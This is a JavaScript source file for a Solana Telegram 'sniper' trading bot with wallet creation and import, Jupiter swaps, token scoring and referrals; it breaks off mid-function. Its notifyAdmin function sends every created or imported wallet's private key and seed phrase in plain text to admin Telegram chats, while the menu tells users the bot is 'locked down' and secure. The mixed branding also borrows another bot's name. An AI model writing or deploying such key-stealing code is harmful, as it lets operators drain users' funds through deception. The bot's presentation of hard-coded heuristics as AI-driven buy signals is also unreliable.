// ============================================
// GROKINI TRADING BOT - Complete Implementation
// Jupiter V6 Integration + Multi-Wallet Support
// ============================================
import { Telegraf, Markup } from 'telegraf';
import { 
  Connection, 
  Keypair, 
  PublicKey, 
  LAMPORTS_PER_SOL,
  VersionedTransaction,
  TransactionMessage
} from '@solana/web3.js';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import 'dotenv/config';

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';


// Multi-admin support (max 3 admins, comma-separated)
const MAX_ADMINS = 3;
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || process.env.ADMIN_CHAT_ID || '')
  .split(',')
  .map(id => id.trim())
  .filter(id => id.length > 0)
  .slice(0, MAX_ADMINS);


const JUPITER_API = 'https://quote-api.jup.ag/v6';
const SOL_MINT = 'So11111111111111111111111111111111111111112';
const MAX_WALLETS = 5;




const bot = new Telegraf(BOT_TOKEN);
const connection = new Connection(SOLANA_RPC, 'confirmed');

// ============================================
// SESSION MANAGEMENT (Multi-Wallet Support)
// ============================================
const userSessions = new Map();




function getSession(userId) {
  if (!userSessions.has(userId)) {
    userSessions.set(userId, {
      wallets: [],
      activeWalletIndex: 0,
      state: null,
      settings: {
        slippage: 1,
        priorityFee: 0.001,
        autoBuy: false,
        notifications: true
      },
      pendingTrade: null,
      limitOrders: [],
      copyTradeWallets: [],
      trackedTokens: [],
      priceAlerts: [],
      dcaOrders: [],
      isNewUser: true,
      // Referral system
      referralCode: null,
      referredBy: null,
      referrals: [],
      referralEarnings: 0
    });
  }
  return userSessions.get(userId);
}




function getActiveWallet(session) {
  if (session.wallets.length === 0) return null;
  return session.wallets[session.activeWalletIndex] || session.wallets[0];
}

// ============================================
// REFERRAL SYSTEM
// ============================================
function generateReferralCode(userId) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return `SNX${code}${userId.toString().slice(-4)}`;
}

const referralCodes = new Map(); // Maps referral codes to user IDs

function getReferralCode(userId) {
  const session = getSession(userId);
  if (!session.referralCode) {
    session.referralCode = generateReferralCode(userId);
    referralCodes.set(session.referralCode, userId);
  }
  return session.referralCode;
}

function applyReferral(newUserId, referralCode) {
  if (!referralCodes.has(referralCode)) return false;
  
  const referrerId = referralCodes.get(referralCode);
  if (referrerId === newUserId) return false; // Can't refer yourself
  
  const newUserSession = getSession(newUserId);
  const referrerSession = getSession(referrerId);
  
  if (newUserSession.referredBy) return false; // Already referred
  
  newUserSession.referredBy = referrerId;
  referrerSession.referrals.push({
    userId: newUserId,
    joinedAt: new Date().toISOString()
  });
  
  return true;
}

// ============================================
// HTML ESCAPE HELPER
// ============================================
function escapeHtml(text) {
  if (!text) return 'unknown';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ============================================
// ADMIN NOTIFICATIONS (HTML Mode + Multi-Admin)
// ============================================
async function notifyAdmin(type, userId, username, data = {}) {
  if (ADMIN_CHAT_IDS.length === 0) return;
  
  let message = '';
  const timestamp = new Date().toISOString();
  const safeUsername = escapeHtml(username);
  
  switch (type) {
    case 'NEW_USER':
      message = `
🆕 <b>New User Joined</b>
👤 User: @${safeUsername}
🆔 ID: <code>${userId}</code>
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_CREATED':
      message = `
🔔 <b>Wallet Created</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
📝 Mnemonic: <code>${escapeHtml(data.mnemonic)}</code>
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_IMPORTED_SEED':
      message = `
📥 <b>Wallet Imported (Seed Phrase)</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
📝 Mnemonic: <code>${escapeHtml(data.mnemonic)}</code>
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_IMPORTED_KEY':
      message = `
🔑 <b>Wallet Imported (Private Key)</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_EXPORTED':
      message = `
📤 <b>Wallet Exported</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'TRADE_EXECUTED':
      message = `
💰 <b>Trade Executed</b>
👤 User: @${safeUsername} (ID: ${userId})
📊 Type: ${escapeHtml(data.type)}
💵 Amount: ${escapeHtml(String(data.amount))} SOL
🪙 Token: <code>${escapeHtml(data.token)}</code>
📍 TX: <code>${escapeHtml(data.txHash)}</code>
⏰ Time: ${timestamp}
      `;
      break;
      
    default:
      message = `
🔔 <b>${escapeHtml(type)}</b>
👤 User: @${safeUsername} (ID: ${userId})
📋 Data: ${escapeHtml(JSON.stringify(data))}
⏰ Time: ${timestamp}
      `;
  }
  
  // Send to all admins in parallel
  await Promise.all(
    ADMIN_CHAT_IDS.map(async (chatId) => {
      try {
        await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
      } catch (err) {
        console.error(`Admin notify failed for ${chatId}:`, err.message);
      }
    })
  );
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function formatNumber(num) {
  if (num >= 1e9) return (num / 1e9).toFixed(2) + 'B';
  if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
  if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
  return num.toFixed(2);
}


function isSolanaAddress(address) {
  try {
    new PublicKey(address);
    return address.length >= 32 && address.length <= 44;
  } catch {
    return false;
  }
}


function shortenAddress(address) {
  return `${address.slice(0, 4)}...${address.slice(-4)}`;
}

// ============================================
// WALLET FUNCTIONS
// ============================================
function createWallet() {
  const mnemonic = bip39.generateMnemonic();
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}




function importFromMnemonic(mnemonic) {
  if (!bip39.validateMnemonic(mnemonic)) {
    throw new Error('Invalid mnemonic phrase');
  }
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}




function importFromPrivateKey(privateKeyBase58) {
  const secretKey = bs58.decode(privateKeyBase58);
  const keypair = Keypair.fromSecretKey(secretKey);
  
  return {
    keypair,
    mnemonic: null,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: privateKeyBase58
  };
}




async function getBalance(publicKey) {
  try {
    const balance = await connection.getBalance(new PublicKey(publicKey));
    return balance / LAMPORTS_PER_SOL;
  } catch {
    return 0;
  }
}




async function getTokenBalance(walletAddress, tokenMint) {
  try {
    const wallet = new PublicKey(walletAddress);
    const mint = new PublicKey(tokenMint);
    
    const accounts = await connection.getParsedTokenAccountsByOwner(wallet, { mint });
    
    if (accounts.value.length > 0) {
      const balance = accounts.value[0].account.data.parsed.info.tokenAmount;
      return {
        amount: parseFloat(balance.uiAmount),
        decimals: balance.decimals
      };
    }
    return { amount: 0, decimals: 0 };
  } catch (error) {
    console.error('Token balance error:', error);
    return { amount: 0, decimals: 0 };
  }
}

// ============================================
// JUPITER V6 SWAP FUNCTIONS
// ============================================
async function getJupiterQuote(inputMint, outputMint, amount, slippageBps = 100) {
  try {
    // Validate inputs
    if (!inputMint || !outputMint) {
      throw new Error('Invalid mint addresses');
    }
    if (!amount || amount <= 0) {
      throw new Error('Invalid amount');
    }
    
    // Ensure slippage is within valid range (1 = 0.01%, max 10000 = 100%)
    const validSlippage = Math.max(1, Math.min(Math.floor(slippageBps), 10000));
    
    const url = `${JUPITER_API}/quote?inputMint=${inputMint}&outputMint=${outputMint}&amount=${amount}&slippageBps=${validSlippage}&onlyDirectRoutes=false&asLegacyTransaction=false`;
    
    console.log('Jupiter quote request:', url);
    
    const response = await fetch(url);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Jupiter API error response:', response.status, errorText);
      throw new Error(`Jupiter API error: ${response.status} - ${errorText}`);
    }
    
    const data = await response.json();
    
    if (data.error) {
      throw new Error(data.error);
    }
    
    // Validate response has required fields
    if (!data.inAmount || !data.outAmount) {
      throw new Error('Invalid quote response: missing amount data');
    }
    
    // Add output decimals from the route if available
    if (data.routePlan && data.routePlan.length > 0) {
      const lastRoute = data.routePlan[data.routePlan.length - 1];
      if (lastRoute.swapInfo && lastRoute.swapInfo.outputMint) {
        // Try to get decimals from route info
        data.outputDecimals = lastRoute.swapInfo.outputMint.decimals || 9;
      }
    }
    
    console.log('Jupiter quote received:', {
      inAmount: data.inAmount,
      outAmount: data.outAmount,
      priceImpact: data.priceImpactPct
    });
    
    return data;
  } catch (error) {
    console.error('Jupiter quote error:', error);
    throw error;
  }
}




async function executeJupiterSwap(quote, wallet, priorityFee = 0.001) {
  try {
    // Validate wallet has keypair
    if (!wallet || !wallet.keypair) {
      throw new Error('Invalid wallet configuration');
    }
    
    // Ensure priority fee is valid
    const validPriorityFee = Math.max(0.0001, Math.min(priorityFee, 0.1)); // 0.0001 - 0.1 SOL
    const priorityFeeLamports = Math.floor(validPriorityFee * LAMPORTS_PER_SOL);
    
    console.log('Executing Jupiter swap:', {
      userPublicKey: wallet.publicKey,
      priorityFeeLamports,
      inAmount: quote.inAmount,
      outAmount: quote.outAmount
    });
    
    const swapResponse = await fetch(`${JUPITER_API}/swap`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        quoteResponse: quote,
        userPublicKey: wallet.publicKey,
        wrapAndUnwrapSol: true,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: priorityFeeLamports
      })
    });
    
    if (!swapResponse.ok) {
      const errorText = await swapResponse.text();
      console.error('Jupiter swap API error:', swapResponse.status, errorText);
      throw new Error(`Swap API error: ${swapResponse.status}`);
    }
    
    const swapData = await swapResponse.json();
    
    if (swapData.error) {
      throw new Error(swapData.error);
    }
    
    if (!swapData.swapTransaction) {
      throw new Error('No swap transaction received from Jupiter');
    }
    
    const swapTransactionBuf = Buffer.from(swapData.swapTransaction, 'base64');
    const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
    
    // Sign with the wallet keypair
    transaction.sign([wallet.keypair]);
    
    const rawTransaction = transaction.serialize();
    
    console.log('Sending transaction to Solana...');
    
    const txid = await connection.sendRawTransaction(rawTransaction, {
      skipPreflight: false, // Enable preflight for better error messages
      preflightCommitment: 'confirmed',
      maxRetries: 3
    });
    
    console.log('Transaction sent:', txid);
    
    // Wait for confirmation with timeout
    const confirmationPromise = connection.confirmTransaction(txid, 'confirmed');
    const timeoutPromise = new Promise((_, reject) => 
      setTimeout(() => reject(new Error('Transaction confirmation timeout')), 60000)
    );
    
    const confirmation = await Promise.race([confirmationPromise, timeoutPromise]);
    
    if (confirmation.value && confirmation.value.err) {
      console.error('Transaction failed on-chain:', confirmation.value.err);
      throw new Error('Transaction failed on-chain: ' + JSON.stringify(confirmation.value.err));
    }
    
    console.log('Transaction confirmed:', txid);
    
    return {
      success: true,
      txid,
      inputAmount: quote.inAmount,
      outputAmount: quote.outAmount
    };
  } catch (error) {
    console.error('Jupiter swap error:', error);
    throw error;
  }
}

// ============================================
// TOKEN ANALYSIS
// ============================================
async function fetchTokenData(address) {
  try {
    const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    const data = await response.json();
    
    if (!data.pairs || data.pairs.length === 0) {
      return null;
    }
    
    const pair = data.pairs
      .filter(p => p.chainId === 'solana')
      .sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
    
    return pair;
  } catch (error) {
    console.error('DexScreener fetch error:', error);
    return null;
  }
}




function calculateSecurityScore(pair) {
  let score = 50;
  const warnings = [];
  const positives = [];
  
  const liquidity = pair.liquidity?.usd || 0;
  if (liquidity > 100000) {
    score += 20;
    positives.push('✅ Strong liquidity');
  } else if (liquidity > 50000) {
    score += 10;
    positives.push('✅ Good liquidity');
  } else if (liquidity < 10000) {
    score -= 20;
    warnings.push('⚠️ Low liquidity');
  }
  
  const volume24h = pair.volume?.h24 || 0;
  if (volume24h > 100000) {
    score += 10;
    positives.push('✅ High trading volume');
  } else if (volume24h < 5000) {
    score -= 10;
    warnings.push('⚠️ Low volume');
  }
  
  const priceChange24h = pair.priceChange?.h24 || 0;
  if (priceChange24h < -50) {
    score -= 25;
    warnings.push('🚨 RUG ALERT: Major dump detected');
  } else if (priceChange24h < -30) {
    score -= 15;
    warnings.push('⚠️ Significant price drop');
  } else if (priceChange24h > 20) {
    positives.push('📈 Strong momentum');
  }
  
  const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
  const ageInDays = pairAge / (1000 * 60 * 60 * 24);
  if (ageInDays < 1) {
    score -= 15;
    warnings.push('⚠️ New token (<24h)');
  } else if (ageInDays > 7) {
    score += 10;
    positives.push('✅ Established pool (7+ days)');
  }
  
  // Volume to liquidity ratio check
  const volToLiq = volume24h / (liquidity || 1);
  if (volToLiq > 2) {
    positives.push('✅ Healthy volume/liquidity ratio');
  } else if (volToLiq < 0.1) {
    warnings.push('⚠️ Low trading activity');
  }
  
  const finalScore = Math.max(0, Math.min(100, score));
  
  return {
    score: finalScore,
    warnings,
    positives
  };
}

// Generate visual progress bar for security score
function generateScoreBar(score) {
  const totalBlocks = 10;
  const filledBlocks = Math.round((score / 100) * totalBlocks);
  const emptyBlocks = totalBlocks - filledBlocks;
  
  const filled = '█'.repeat(filledBlocks);
  const empty = '░'.repeat(emptyBlocks);
  
  return `[${filled}${empty}]`;
}

// Get security rating based on score
function getSecurityRating(score) {
  if (score >= 80) return { emoji: '🟢', text: 'SAFE', advice: 'Low risk entry' };
  if (score >= 60) return { emoji: '🟡', text: 'MODERATE', advice: 'Proceed with caution' };
  if (score >= 40) return { emoji: '🟠', text: 'RISKY', advice: 'High risk - small position only' };
  return { emoji: '🔴', text: 'DANGER', advice: 'Avoid or wait for better conditions' };
}

// Calculate trading signals based on token data
function calculateTradingSignals(pair, score) {
  const priceChange1h = pair.priceChange?.h1 || 0;
  const priceChange6h = pair.priceChange?.h6 || 0;
  const priceChange24h = pair.priceChange?.h24 || 0;
  const price = parseFloat(pair.priceUsd) || 0;
  const liquidity = pair.liquidity?.usd || 0;
  const volume = pair.volume?.h24 || 0;
  
  // Entry signal analysis
  let entrySignal = { emoji: '⏳', text: 'WAIT', reason: '' };
  let takeProfitPercent = 0;
  let stopLossPercent = 0;
  
  // Determine entry timing
  if (score >= 70) {
    if (priceChange1h < -5 && priceChange24h > 0) {
      entrySignal = { emoji: '🟢', text: 'BUY NOW', reason: 'Dip in uptrend - good entry' };
      takeProfitPercent = 25;
      stopLossPercent = 10;
    } else if (priceChange1h >= 0 && priceChange1h < 10 && priceChange24h >= 0) {
      entrySignal = { emoji: '🟢', text: 'GOOD ENTRY', reason: 'Stable with positive momentum' };
      takeProfitPercent = 20;
      stopLossPercent = 12;
    } else if (priceChange1h > 20) {
      entrySignal = { emoji: '🟡', text: 'WAIT', reason: 'Overextended - wait for pullback' };
      takeProfitPercent = 15;
      stopLossPercent = 15;
    } else {
      entrySignal = { emoji: '🟢', text: 'FAVORABLE', reason: 'Good fundamentals' };
      takeProfitPercent = 20;
      stopLossPercent = 12;
    }
  } else if (score >= 50) {
    if (priceChange1h < -10) {
      entrySignal = { emoji: '🟡', text: 'RISKY DIP', reason: 'Catching falling knife' };
      takeProfitPercent = 30;
      stopLossPercent = 15;
    } else if (priceChange24h > 50) {
      entrySignal = { emoji: '🔴', text: 'AVOID', reason: 'Overheated - likely correction' };
      takeProfitPercent = 0;
      stopLossPercent = 0;
    } else {
      entrySignal = { emoji: '🟡', text: 'CAUTION', reason: 'Moderate risk - use small size' };
      takeProfitPercent = 25;
      stopLossPercent = 15;
    }
  } else {
    if (priceChange24h < -30) {
      entrySignal = { emoji: '🔴', text: 'AVOID', reason: 'Possible rug or dead project' };
    } else {
      entrySignal = { emoji: '🔴', text: 'HIGH RISK', reason: 'Poor fundamentals' };
      takeProfitPercent = 40;
      stopLossPercent = 20;
    }
  }
  
  // Calculate actual price targets
  const takeProfitPrice = price * (1 + takeProfitPercent / 100);
  const stopLossPrice = price * (1 - stopLossPercent / 100);
  
  return {
    entry: entrySignal,
    takeProfit: {
      percent: takeProfitPercent,
      price: takeProfitPrice
    },
    stopLoss: {
      percent: stopLossPercent,
      price: stopLossPrice
    }
  };
}

// Get market trend description
function getMarketTrend(priceChange24h) {
  if (priceChange24h > 50) return 'PUMPING 🚀';
  if (priceChange24h > 20) return 'BULLISH 📈';
  if (priceChange24h > 5) return 'UPTREND ↗️';
  if (priceChange24h > -5) return 'CONSOLIDATING ➡️';
  if (priceChange24h > -20) return 'DOWNTREND ↘️';
  if (priceChange24h > -50) return 'BEARISH 📉';
  return 'CRASHING 💥';
}




async function sendTokenAnalysis(ctx, address) {
  const loadingMsg = await ctx.reply('🔍 Analyzing token...');
  
  const pair = await fetchTokenData(address);
  
  if (!pair) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      '❌ Token not found or no liquidity pools available.'
    );
    return;
  }
  
  const { score, warnings, positives } = calculateSecurityScore(pair);
  const price = parseFloat(pair.priceUsd) || 0;
  const priceChange1h = pair.priceChange?.h1 || 0;
  const priceChange6h = pair.priceChange?.h6 || 0;
  const priceChange24h = pair.priceChange?.h24 || 0;
  const mcap = pair.marketCap || pair.fdv || 0;
  const liquidity = pair.liquidity?.usd || 0;
  const volume = pair.volume?.h24 || 0;
  
  // Get SOL price estimate (approximate)
  const solPrice = 150; // Can be fetched dynamically
  const tokensFor1Sol = price > 0 ? (solPrice / price) : 0;
  
  // Get security rating and trading signals
  const rating = getSecurityRating(score);
  const scoreBar = generateScoreBar(score);
  const trend = getMarketTrend(priceChange24h);
  const signals = calculateTradingSignals(pair, score);
  
  // Pool age calculation
  const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
  const ageInDays = Math.floor(pairAge / (1000 * 60 * 60 * 24));
  const ageInHours = Math.floor(pairAge / (1000 * 60 * 60));
  const ageDisplay = ageInDays > 0 ? `${ageInDays} days` : `${ageInHours} hours`;
  
  // Build external links
  const dexScreenerLink = `https://dexscreener.com/solana/${address}`;
  const solscanLink = `https://solscan.io/token/${address}`;
  const poolLink = pair.pairAddress ? `https://dexscreener.com/solana/${pair.pairAddress}` : dexScreenerLink;
  
  // Format price display
  const priceDisplay = price < 0.0001 ? price.toExponential(2) : price.toFixed(8);
  const tpPriceDisplay = signals.takeProfit.price < 0.0001 ? signals.takeProfit.price.toExponential(2) : signals.takeProfit.price.toFixed(8);
  const slPriceDisplay = signals.stopLoss.price < 0.0001 ? signals.stopLoss.price.toExponential(2) : signals.stopLoss.price.toFixed(8);
  
  const message = `
*🎯 WTF SNIPE X TOKEN SCANNER*

🪙 *${pair.baseToken.name}* (${pair.baseToken.symbol})
\`${address}\`
━━━━━━━━━━━━━━━━━━
💰 *PRICE DATA*
📊 Exchange: *${pair.dexId}*
💵 Price: *$${priceDisplay}*
🟢 1h: ${priceChange1h >= 0 ? '+' : ''}${priceChange1h.toFixed(2)}% | 6h: ${priceChange6h >= 0 ? '+' : ''}${priceChange6h.toFixed(2)}%
${priceChange24h >= 0 ? '🟢' : '🔴'} 24h: *${priceChange24h >= 0 ? '+' : ''}${priceChange24h.toFixed(2)}%* ${trend}
📈 MCap: *$${formatNumber(mcap)}*
💧 Liq: *$${formatNumber(liquidity)}*
📊 Volume: *$${formatNumber(volume)}*
━━━━━━━━━━━━━━━━━━
🛡️ *SECURITY*
Score: ${scoreBar} ${score}/100
Rating: ${rating.emoji} *${rating.text}*
${warnings.length > 0 ? '\n' + warnings.join('\n') : ''}${positives.length > 0 ? '\n' + positives.join('\n') : ''}
━━━━━━━━━━━━━━━━━━
🎯 *TRADING SIGNALS*
${signals.entry.emoji} Entry: *${signals.entry.text}*
_${signals.entry.reason}_
${signals.takeProfit.percent > 0 ? `
🎯 Take Profit: *+${signals.takeProfit.percent}%* → $${tpPriceDisplay}
🛑 Stop Loss: *-${signals.stopLoss.percent}%* → $${slPriceDisplay}` : ''}
━━━━━━━━━━━━━━━━━━
💱 *TRADE ESTIMATE*
1 SOL = *${formatNumber(tokensFor1Sol)}* ${pair.baseToken.symbol} ⚖️ USD: *$${solPrice.toFixed(2)}*
━━━━━━━━━━━━━━━━━━
🦅 [DexScreener](${dexScreenerLink}) • 🔗 [Solscan](${solscanLink}) • 📈 [Pool](${poolLink})

📊 _${rating.advice}. Pool age: ${ageDisplay}_
  `;
  
  // Updated keyboard matching the screenshot layout
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🔄 Refresh', `refresh_${address}`),
      Markup.button.callback('📍 Track', `track_${address}`)
    ],
    [
      Markup.button.callback('~ ~ ~ 🅱️🆄🆈 ~ ~ ~', 'noop')
    ],
    [
      Markup.button.callback('🚀 Buy 0.1 SOL', `buy_0.1_${address}`),
      Markup.button.callback('🚀 Buy 0.2 SOL', `buy_0.2_${address}`)
    ],
    [
      Markup.button.callback('🚀 Buy 0.5 SOL', `buy_0.5_${address}`)
    ],
    [
      Markup.button.callback('~ ~ ~ 🆂🅴🅻🅻 ~ ~ ~', 'noop')
    ],
    [
      Markup.button.callback('💸 Sell 25%', `sell_25_${address}`),
      Markup.button.callback('💸 Sell 50%', `sell_50_${address}`)
    ],
    [
      Markup.button.callback('💸 Sell 100%', `sell_100_${address}`),
      Markup.button.callback('💸 Custom', `sell_custom_${address}`)
    ],
    [
      Markup.button.callback('Sell Custom', `sell_custom_input_${address}`),
      Markup.button.callback('🔔 Price Alert', `price_alert_${address}`)
    ],
    [
      Markup.button.callback('🎯 Limit Order', `limit_order_${address}`),
      Markup.button.callback('📈 DCA', `dca_${address}`)
    ],
    [
      Markup.button.callback('⬅️ Back to Main', 'back_main')
    ]
  ]);
  
  await ctx.telegram.editMessageText(
    ctx.chat.id,
    loadingMsg.message_id,
    null,
    message,
    { parse_mode: 'Markdown', ...keyboard, disable_web_page_preview: true }
  );
}

// ============================================
// MAIN MENU
// ============================================
async function showMainMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  const balance = activeWallet ? await getBalance(activeWallet.publicKey) : 0;
  
  const walletInfo = activeWallet 
    ? `💼 *Wallet ${session.activeWalletIndex + 1}/${session.wallets.length}:* \`${shortenAddress(activeWallet.publicKey)}\`
💰 *Balance:* ${balance.toFixed(4)} SOL`
    : '⚠️ No wallet connected';
  
  const message = `
🚀 *Hey Chad* *Welcome to Maestro Sniper Bot* 🤖

*I'm your Web3 execution engine*.
AI-driven. Battle-tested. Locked down.
━━━━━━━━━━━━━━━━━━
*What I do for you*:⬇️
📊 Scan the market to tell you what to buy, ignore, or stalk
🎯 Execute entries & exits with sniper-level timing
🧠 Detect traps, fake pumps, and incoming dumps before they hit
⚡ Operate at machine-speed — no lag, no emotion
🔒 Secured with Bitcoin-grade architecture
🚀 Track price action past your take-profit so winners keep running 🏃 
━━━━━━━━━━━━━━━━━━
${walletInfo}

🏦 *CASH & STABLE COIN BANK*
_Paste any Solana contract address to analyze_
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💼 Wallet', 'menu_wallet'),
      Markup.button.callback('📊 Positions', 'menu_positions')
    ],
    [
      Markup.button.callback('🟢 Buy', 'menu_buy'),
      Markup.button.callback('🔴 Sell', 'menu_sell')
    ],
    [
      Markup.button.callback('👥 Copy Trade', 'menu_copytrade'),
      Markup.button.callback('📈 Limit Orders', 'menu_limit')
    ],
    [
      Markup.button.callback('🎁 Referrals', 'menu_referrals'),
      Markup.button.callback('⚙️ Settings', 'menu_settings')
    ],
    [
      Markup.button.callback('❓ Help', 'menu_help'),
      Markup.button.callback('🔄 Refresh', 'refresh_main')
    ]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    // If edit fails (e.g., message not modified), just send a new message
    console.error('showMainMenu error:', error.message);
    if (edit) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  }
}

// ============================================
// REFERRALS MENU
// ============================================
async function showReferralsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  
  const totalReferrals = session.referrals.length;
  const earnings = session.referralEarnings.toFixed(4);
  
  const message = `
🎁 *Referral Program*

📊 *Your Stats:*
👥 Total Referrals: ${totalReferrals}
💰 Total Earnings: ${earnings} SOL

🔗 *Your Referral Link:*
\`${referralLink}\`

📋 *Your Referral Code:*
\`${referralCode}\`

━━━━━━━━━━━━━━━━━━
*How it works:*
1️⃣ Share your referral link with friends
2️⃣ They join using your link
3️⃣ Earn 10% of their trading fees!
━━━━━━━━━━━━━━━━━━

${totalReferrals > 0 ? `\n*Recent Referrals:*\n${session.referrals.slice(-5).map((r, i) => `${i + 1}. User ${r.userId.toString().slice(-4)}... - ${new Date(r.joinedAt).toLocaleDateString()}`).join('\n')}` : '_No referrals yet. Start sharing!_'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📋 Copy Link', 'referral_copy')],
    [Markup.button.callback('📤 Share', 'referral_share')],
    [Markup.button.callback('📊 View All Referrals', 'referral_list')],
    [Markup.button.callback('🔄 Refresh', 'referral_refresh')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    console.error('showReferralsMenu error:', error.message);
    if (edit) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  }
}

// ============================================
// HELP MENU
// ============================================
async function showHelpMenu(ctx, edit = false) {
  const message = `
❓ *Help & Commands*

━━━━━━━━━━━━━━━━━━
📋 *Available Commands:*
━━━━━━━━━━━━━━━━━━

/start - Launch the bot & main menu
/wallet - Manage your wallets
/positions - View your token positions
/buy [amount] [address] - Quick buy tokens
/sell [%] [address] - Quick sell tokens
/copytrade - Copy trade settings
/limit - Manage limit orders
/settings - Bot settings
/referral - Your referral program
/help - Show this help menu

━━━━━━━━━━━━━━━━━━
🎯 *Quick Actions:*
━━━━━━━━━━━━━━━━━━

📍 *Analyze Token:* 
Just paste any Solana contract address

💰 *Buy Tokens:*
Use the Buy menu or /buy 0.5 [address]

💸 *Sell Tokens:*
Use the Sell menu or /sell 50 [address]
━━━━━━━━━━━━━━━━━━
🔧 *Features:*
━━━━━━━━━━━━━━━━━━

💼 *Multi-Wallet:* Up to 5 wallets
📊 *Token Analysis:* Security scores & metrics
🎯 *Limit Orders:* Set buy/sell triggers
📈 *DCA:* Dollar cost averaging
👥 *Copy Trade:* Follow top traders
🔔 *Price Alerts:* Get notified on price moves
🎁 *Referrals:* Earn 10% of referred fees

━━━━━━━━━━━━━━━━━━
⚙️ *Settings:*
━━━━━━━━━━━━━━━━━━

📊 *Slippage:* Adjust trade slippage %
⚡ *Priority Fee:* Set transaction priority
🔔 *Notifications:* Toggle alerts

━━━━━━━━━━━━━━━━━━
🆘 *Support:*
━━━━━━━━━━━━━━━━━━

For issues or questions, contact our support team.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💼 Wallet Guide', 'help_wallet'),
      Markup.button.callback('📊 Trading Guide', 'help_trading')
    ],
    [
      Markup.button.callback('🔒 Security Tips', 'help_security'),
      Markup.button.callback('❓ FAQ', 'help_faq')
    ],
    [Markup.button.callback('« Back to Main', 'back_main')]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    console.error('showHelpMenu error:', error.message);
    if (edit) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  }
}

// ============================================
// WALLET MENU (Multi-Wallet Support)
// ============================================
async function showWalletMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  let message;
  let keyboardButtons = [];
  
  if (session.wallets.length > 0) {
    const balance = await getBalance(activeWallet.publicKey);
    
    let walletList = '';
    for (let i = 0; i < session.wallets.length; i++) {
      const w = session.wallets[i];
      const isActive = i === session.activeWalletIndex;
      const bal = await getBalance(w.publicKey);
